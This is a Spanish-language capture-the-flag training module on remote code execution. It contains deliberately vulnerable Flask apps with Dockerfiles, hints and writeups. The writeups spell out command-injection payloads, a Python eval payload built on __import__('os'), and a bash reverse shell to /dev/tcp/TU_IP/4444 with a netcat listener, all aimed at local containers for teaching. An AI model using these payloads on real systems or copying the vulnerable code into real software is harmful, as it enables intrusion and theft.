# Módulo 2: Exploitation — Remote Code Execution (RCE)

> **Nivel:** Level 0 to Hero · **Categoría:** Web / Exploitation
> **Requisitos previos:** Módulo 1 recomendado. Saber abrir una terminal y usar Docker.
>
> ⚠️ **Entorno seguro:** Todas las apps de este módulo son **intencionalmente vulnerables** y corren **solo dentro de contenedores Docker en tu máquina**. Nunca apuntes estas técnicas a servidores que no te pertenezcan: sin permiso, es ilegal. Aquí, tú eres dueño y atacante a la vez.

---

## 1. Introducción y Modelo Mental

### La Analogía del Mundo Real

Imagina un restaurante con una ventanilla para pedidos. El cliente escribe su orden en un papelito y el cocinero la ejecuta al pie de la letra. El sistema asume que el papel solo contendrá comida: *"dos tacos"*. Pero, ¿qué pasa si el cliente escribe *"dos tacos; y de paso, ábreme la caja registradora y pásame el dinero"*? Si el cocinero obedece cualquier cosa escrita en el papel sin distinguir entre "comida" y "órdenes al local", acabas de robar el restaurante con un bolígrafo.

**Remote Code Execution (RCE)** es exactamente eso: lograr que un servidor ejecute *tus* comandos porque confundió tu entrada (datos) con una instrucción (código). El servidor tenía una ventanilla —un formulario, un parámetro, un campo— que enviaba tu texto directo a la "cocina" (el sistema operativo o el intérprete) sin revisarlo.

### Impacto Real

RCE es la vulnerabilidad más crítica que existe: quien la logra puede leer bases de datos, robar credenciales, instalar malware o pivotar a toda la red interna. Casos históricos como Log4Shell o Shellshock paralizaron a medio internet. Por eso los **pentesters** valen su peso en oro: encontrar y reportar un RCE **antes** que un atacante puede ahorrarle a una empresa millones y su reputación.

### Objetivo del Módulo

Al terminar sabrás **identificar puntos de inyección de comandos y de código**, explotar tanto **command injection** (inyectar en el shell del sistema) como **code injection** (inyectar en un intérprete como Python vía `eval`), y establecer una **reverse shell** con Netcat para obtener control interactivo del contenedor.

---

## 2. Glosario Rápido

| Término | Definición en una frase |
|---|---|
| **RCE** | Ejecutar tus propios comandos en una máquina remota que no controlas directamente. |
| **Command Injection** | Inyectar comandos del sistema operativo a través de una entrada mal saneada. |
| **Code Injection** | Inyectar código de un lenguaje (p. ej. Python) que el servidor evalúa con `eval`/`exec`. |
| **Payload** | La cadena maliciosa que envías para disparar la vulnerabilidad. |
| **Reverse Shell** | El servidor víctima se conecta *hacia ti* y te entrega una terminal interactiva. |
| **Bind Shell** | Lo contrario: la víctima abre un puerto y tú te conectas hacia ella. |
| **Sanitización** | Limpiar/validar la entrada del usuario para que no contenga caracteres peligrosos. |

---

## 3. Cheat Sheet: Caja de Herramientas y Comandos

### Tabla de Herramientas

| Herramienta | Función | Dónde obtenerla |
|---|---|---|
| **Docker** | Levanta las apps vulnerables aisladas. | https://docs.docker.com/get-docker/ |
| **curl** | Enviar payloads por HTTP desde la terminal. | Preinstalado en Linux/macOS. |
| **Netcat (`nc`)** | Escuchar conexiones y recibir reverse shells. | `sudo apt install netcat-openbsd` / `brew install netcat` |
| **Burp Suite (Community)** | Interceptar y modificar peticiones HTTP a mano. | https://portswigger.net/burp/communitydownload |
| **Navegador web** | Explorar la app y sus formularios. | El que ya usas. |
| **Python 3** | Escribir exploits y servidores de prueba. | https://python.org |

### Top Comandos / Sintaxis

```bash
# 1. Construir y correr una app vulnerable desde su Dockerfile
docker build -t reto-rce .          # -t = etiqueta/nombre de la imagen
docker run --rm -p 8080:5000 reto-rce  # publica el puerto 5000 del contenedor en tu 8080

# 2. Enviar un payload de command injection por un parámetro
curl "http://localhost:8080/ping?host=127.0.0.1;id"   # ';id' es el comando inyectado

# 3. Enviar un payload por POST (formularios)
curl -X POST http://localhost:8080/calc -d "expr=__import__('os').system('id')"

# 4. Poner Netcat a la escucha para recibir una reverse shell
nc -lvnp 4444        # -l escucha, -v verboso, -n sin DNS, -p puerto 4444

# 5. Payload clásico de reverse shell (se ejecuta en la víctima)
bash -i >& /dev/tcp/TU_IP/4444 0>&1   # conecta la shell de la víctima hacia ti

# 6. Encontrar la flag una vez dentro
find / -name "flag*" 2>/dev/null      # busca archivos flag ignorando errores
cat /flag.txt                         # leer la flag
```

> **Consejo:** `2>/dev/null` esconde los errores de "permiso denegado" para que el resultado útil no se pierda entre ruido.

---

## 4. Tutorial Guiado — "Laboratorio 0"

### El Escenario

"Botica Digital" expone una herramienta interna de red: una página que hace `ping` a un host para ver si está vivo. El desarrollador tomó el nombre del host del usuario y lo pegó directo en un comando del sistema. Vas a convertir ese `ping` en tu ventanilla de robo.

### Paso 1 — Crea la app vulnerable

Crea una carpeta `lab0/` con dos archivos.

`app.py`:

```python
from flask import Flask, request
import subprocess
app = Flask(__name__)

@app.route("/ping")
def ping():
    host = request.args.get("host", "127.0.0.1")
    # ❌ VULNERABLE: concatena la entrada del usuario directo al shell
    salida = subprocess.check_output(f"ping -c 1 {host}", shell=True)
    return "<pre>" + salida.decode(errors="ignore") + "</pre>"

app.run(host="0.0.0.0", port=5000)
```

`Dockerfile`:

```dockerfile
FROM python:3.11-slim
RUN pip install flask
RUN echo "FLAG{command_injection_basico}" > /flag.txt
COPY app.py /app.py
CMD ["python", "/app.py"]
```

### Paso 2 — Construye y levanta el reto

```bash
cd lab0
docker build -t lab0-rce .
docker run --rm -p 8080:5000 lab0-rce
```

Deja esa terminal corriendo.

**¿Por qué?** Docker crea un mini-sistema aislado con la app dentro. `-p 8080:5000` conecta tu puerto `8080` al `5000` del contenedor. Ya tienes la "víctima" viva.

### Paso 3 — Usa la app de forma normal

En otra terminal:

```bash
curl "http://localhost:8080/ping?host=127.0.0.1"
```

Verás la salida normal de un `ping`. Todo "legítimo"... por ahora.

### Paso 4 — Inyecta tu primer comando

```bash
curl "http://localhost:8080/ping?host=127.0.0.1;id"
```

Después de la salida del ping verás algo como `uid=0(root) gid=0(root)`.

**¿Por qué ocurrió?** El código construyó la cadena `ping -c 1 127.0.0.1;id`. El punto y coma (`;`) le dice al shell *"termina este comando y ejecuta el siguiente"*. El servidor obedeció porque `shell=True` interpreta toda la cadena como una orden de terminal, sin distinguir tu dato del comando original.

### Paso 5 — Roba la flag

```bash
curl "http://localhost:8080/ping?host=127.0.0.1;cat%20/flag.txt"
```

> `%20` es un espacio codificado para URL. Verás `FLAG{command_injection_basico}`.

### Paso 6 — Limpia

Presiona `Ctrl+C` en la terminal del contenedor. Como usamos `--rm`, Docker lo borra solo.

🎉 **Primer RCE conseguido.** Ejecutaste comandos arbitrarios en un servidor a través de un simple campo de texto.

---

## 5. Especificación de Retos Progresivos

---

### 🟢 Nivel 1 — "El Ping de la Muerte" (50 pts)

**Historia / Contexto:** Idéntico al Laboratorio 0, pero la flag no está en la raíz: está escondida en el sistema. Encuéntrala y léela.

**Especificación Técnica de Despliegue** — `Dockerfile`:

```dockerfile
FROM python:3.11-slim
RUN pip install flask
RUN mkdir -p /opt/secreto && echo "FLAG{rce_a_traves_de_ping}" > /opt/secreto/flag.txt
COPY app.py /app.py
CMD ["python", "/app.py"]
```

`app.py` = el mismo del Laboratorio 0 (endpoint `/ping` vulnerable).

**Formato de la Flag:** `FLAG{rce_a_traves_de_ping}`

**Sistema de Pistas:**
- **Pista 1 (Gratis):** Ya sabes inyectar un comando. Ahora no sabes *dónde* está la flag. ¿Qué comando de Linux busca archivos por nombre en todo el disco?
- **Pista 2 (−10%):** Inyecta `find / -name flag.txt 2>/dev/null` para localizar la ruta.
- **Pista 3 (−30%):** `...?host=127.0.0.1;find / -name flag.txt 2>/dev/null` te da la ruta `/opt/secreto/flag.txt`; luego `...;cat /opt/secreto/flag.txt`.

**Writeup Oficial:**
1. Confirma la inyección con `;id`.
2. Localiza la flag: `curl "http://localhost:8080/ping?host=1;find%20/%20-name%20flag.txt%202>/dev/null"`.
3. Devuelve `/opt/secreto/flag.txt`.
4. Léela: `curl "http://localhost:8080/ping?host=1;cat%20/opt/secreto/flag.txt"` → `FLAG{rce_a_traves_de_ping}`.

---

### 🟡 Nivel 2 — "La Calculadora Traicionera" (100 pts)

**Historia / Contexto:** El equipo aprendió la lección y eliminó todo comando de shell. Ahora hay una "calculadora científica" que evalúa expresiones matemáticas del usuario con `eval()` de Python. Creyeron que era seguro porque "solo son números". Se equivocaron.

**Especificación Técnica de Despliegue:**

`app.py`:

```python
from flask import Flask, request
app = Flask(__name__)

@app.route("/calc")
def calc():
    expr = request.args.get("expr", "1+1")
    try:
        # ❌ VULNERABLE: eval ejecuta CUALQUIER código Python, no solo aritmética
        return "Resultado: " + str(eval(expr))
    except Exception as e:
        return "Error: " + str(e)

app.run(host="0.0.0.0", port=5000)
```

`Dockerfile`:

```dockerfile
FROM python:3.11-slim
RUN pip install flask
RUN echo "FLAG{eval_no_es_una_calculadora}" > /flag.txt
COPY app.py /app.py
CMD ["python", "/app.py"]
```

**Formato de la Flag:** `FLAG{eval_no_es_una_calculadora}`

**Sistema de Pistas:**
- **Pista 1 (Gratis):** `eval` no distingue entre `2+2` y una llamada a funciones del sistema. ¿Cómo se ejecutan comandos del sistema desde Python?
- **Pista 2 (−10%):** El módulo `os` tiene `os.popen("comando").read()`. ¿Cómo lo importas dentro de una sola expresión?
- **Pista 3 (−30%):** Usa `__import__('os').popen('cat /flag.txt').read()` como valor de `expr`.

**Writeup Oficial:**
1. `eval("1+1")` da 2, pero `eval` acepta *cualquier* expresión Python válida.
2. Como no puedes usar `import` (es una sentencia, no expresión), usa la función `__import__`.
3. Envía:
   ```bash
   curl "http://localhost:8080/calc" --data-urlencode "expr=__import__('os').popen('cat /flag.txt').read()"
   ```
4. La respuesta contiene `FLAG{eval_no_es_una_calculadora}`. Lección: `eval` sobre entrada del usuario es RCE instantáneo.

---

### 🔴 Nivel 3 — "Sombra Reversa" (200 pts)

**Historia / Contexto:** El servidor de logística ejecuta comandos pero **no te devuelve la salida** (es "ciego"): responde siempre "Tarea encolada". No puedes leer la flag directamente por HTTP. Necesitas una **reverse shell** para entrar y mirar tú mismo. Combina RCE ciego + shell interactiva.

**Especificación Técnica de Despliegue:**

`app.py`:

```python
from flask import Flask, request
import subprocess
app = Flask(__name__)

@app.route("/tarea")
def tarea():
    cmd = request.args.get("cmd", "echo hola")
    # ❌ VULNERABLE y CIEGO: ejecuta pero no devuelve la salida
    subprocess.Popen(cmd, shell=True)
    return "Tarea encolada. Gracias."

app.run(host="0.0.0.0", port=5000)
```

`Dockerfile`:

```dockerfile
FROM python:3.11-slim
RUN pip install flask
RUN apt-get update && apt-get install -y netcat-openbsd iproute2 && rm -rf /var/lib/apt/lists/*
RUN echo "FLAG{reverse_shell_maestro}" > /root/flag.txt
COPY app.py /app.py
CMD ["python", "/app.py"]
```

> **Nota de despliegue:** Para practicar la reverse shell en local, corre el contenedor con la red del host para que la víctima pueda conectarse a tu `nc`:
> `docker run --rm --network host reto-nivel3`
> (En Docker Desktop/macOS-Windows, usa `host.docker.internal` como IP destino en el payload en lugar de tu IP.)

**Formato de la Flag:** `FLAG{reverse_shell_maestro}`

**Sistema de Pistas:**
- **Pista 1 (Gratis):** El servidor ejecuta tu comando pero no te muestra nada. Si no puede "hablarte" por la web, ¿cómo lograrías que te "llame" por otro canal?
- **Pista 2 (−10%):** Pon un `nc -lvnp 4444` a la escucha en tu máquina y haz que la víctima ejecute una reverse shell hacia ese puerto.
- **Pista 3 (−30%):** Payload (URL-encoded) para `cmd`:
  `bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'`. Cuando la shell aterrice en tu Netcat, `cat /root/flag.txt`.

**Writeup Oficial:**
1. En tu máquina: `nc -lvnp 4444` (queda esperando).
2. Dispara la reverse shell (reemplaza `TU_IP`; en Docker Desktop usa `host.docker.internal`):
   ```bash
   curl -G "http://localhost:8080/tarea" \
        --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'"
   ```
3. Tu Netcat recibe una shell interactiva del contenedor. Ahora *tú* ves la salida.
4. En esa shell: `cat /root/flag.txt` → `FLAG{reverse_shell_maestro}`.
5. Lección: un RCE "ciego" sigue siendo total; solo cambias el canal de salida de HTTP a una conexión TCP hacia ti.

---

## 6. "¡Me Atoré!" — Errores Comunes y Resolución de Problemas

**1. "Mi payload en `curl` no hace nada o da error de sintaxis."**
Los caracteres especiales (`;`, `&`, espacios, comillas) confunden a tu propia terminal *antes* de salir. Usa `--data-urlencode` para POST, o codifica en la URL (`%20` espacio, `%3B` `;`). Encierra la URL entera entre comillas dobles. Cuando dudes, prueba el payload primero con algo inofensivo como `;id`.

**2. "`connection refused` al levantar la reverse shell."**
Tres causas típicas: (a) olvidaste poner `nc -lvnp 4444` a la escucha *antes* de disparar; (b) la IP está mal —desde un contenedor, `127.0.0.1` es el propio contenedor, no tú: usa tu IP de LAN o `host.docker.internal`; (c) un firewall bloquea el puerto 4444, prueba otro como 9001.

**3. "El `docker build` falla o el puerto ya está en uso."**
Si ves "port is already allocated", otro proceso usa el 8080: cambia a `-p 8090:5000`. Si `docker build` falla por red al instalar paquetes, verifica tu conexión y reintenta; para `apt-get`, no olvides `apt-get update` antes de `install` en el Dockerfile.

---

> **Nota final del mentor:** Todo RCE nace de la misma raíz: **mezclar datos con instrucciones**. `shell=True`, `eval()`, `exec()`, deserialización insegura... son ventanillas donde el texto del usuario se vuelve orden. Como defensor, tu mantra será: *nunca confíes en la entrada, usa APIs parametrizadas (`subprocess.run([...])` sin shell), y jamás evalúes strings del usuario*. En el Módulo 3 aprenderás a sacar los datos robados de una red. Nos vemos. 🚀
